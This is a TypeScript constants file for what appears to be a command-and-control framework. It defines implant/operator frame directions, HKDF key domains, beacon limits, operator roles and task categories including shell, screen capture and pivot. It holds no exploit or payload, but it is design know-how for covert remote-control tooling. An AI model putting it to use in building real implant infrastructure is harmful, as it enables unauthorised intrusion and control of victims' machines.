/**
 * 协议常量。改动任何一项都要同步 docs/03-protocol/01-envelope.md。
 */

/** 协议版本（硬版本，不兼容就 400 E_VERSION）。 */
export const PROTO_V = 1;

/** HKDF 的 info 域分隔：不同用途派生不同密钥，跨域解密必然失败。 */
export const KDF_INFO = {
  reg: 'stc2/v1/reg',
  sess: 'stc2/v1/sess',
  cmd: 'stc2/v1/cmd',
  io: 'stc2/v1/io',
  file: 'stc2/v1/file',
} as const;

export type KeyDomain = keyof typeof KDF_INFO;

/** AAD 前缀。 */
export const AAD_PREFIX = 'stc2/v1';

/** 方向字节：写进 AAD，防止把上行帧塞回下行。 */
export const DIR = {
  opToImplant: 0x00,
  implantToOp: 0x01,
} as const;

/** 帧类型 → 使用的密钥域。 */
export const FRAME_DOMAIN: Record<string, KeyDomain | null> = {
  hello: null,
  hello_ack: null,
  hb: null,
  hb_ack: null,
  cmd: 'cmd',
  res: 'cmd',
  io: 'io',
  file: 'file',
  ack: null,
  screen: null,
  pivot: 'cmd',
  bye: null,
  err: null,
};

export const LIMITS = {
  /** 单帧密文上限（1 MiB）——超过走文件通道。 */
  maxFrameCt: 1 << 20,
  /** 单次 beacon 请求的上行帧数。 */
  maxBeaconUp: 32,
  /** 单次 beacon 请求的下行帧数。 */
  maxBeaconDown: 20,
  /** beacon 请求体上限（256 KB）。 */
  maxBeaconBytes: 256 << 10,
  /** 文件分片大小 4 MiB。 */
  chunkSize: 4 << 20,
  /** 结果内联阈值：超过则写 R2。 */
  inlineResult: 4 << 10,
  /** 结果外置阈值：超过则 res 只带引用。 */
  outRefThreshold: 64 << 10,
  /** seq 去重窗口。 */
  seqWindow: 256,
  /** 允许的时钟漂移（秒）。 */
  clockSkew: 300,
  /** 注册 nonce 保留（秒）。 */
  nonceTtl: 86400,
  /** 一次性下载令牌 TTL（秒）。 */
  downloadTtl: 600,
} as const;

export const ROLES = ['viewer', 'operator', 'admin'] as const;
export type Role = (typeof ROLES)[number];

export const ROLE_RANK: Record<Role, number> = { viewer: 0, operator: 1, admin: 2 };

export function roleAtLeast(role: Role, min: Role): boolean {
  return ROLE_RANK[role] >= ROLE_RANK[min];
}

/** 粗分类（服务端可见）。METADATA_MODE=none 时统一写 'e2e'。 */
export const TASK_CATEGORIES = [
  'shell',
  'exec',
  'file',
  'proc',
  'screen',
  'net',
  'pivot',
  'sys',
  'module',
  'e2e',
] as const;
export type TaskCategory = (typeof TASK_CATEGORIES)[number];

/** 破坏性分类：服务端强制二次确认，且永不自动重投。 */
export const DESTRUCTIVE_CATEGORIES: TaskCategory[] = ['pivot', 'module'];

/** 会话状态。 */
export const SESSION_STATUS = ['online', 'offline', 'dead', 'quarantined'] as const;
export type SessionStatus = (typeof SESSION_STATUS)[number];

/** 任务状态机。 */
export const TASK_STATUS = [
  'queued',
  'dispatched',
  'running',
  'done',
  'failed',
  'expired',
  'canceled',
] as const;
export type TaskStatus = (typeof TASK_STATUS)[number];
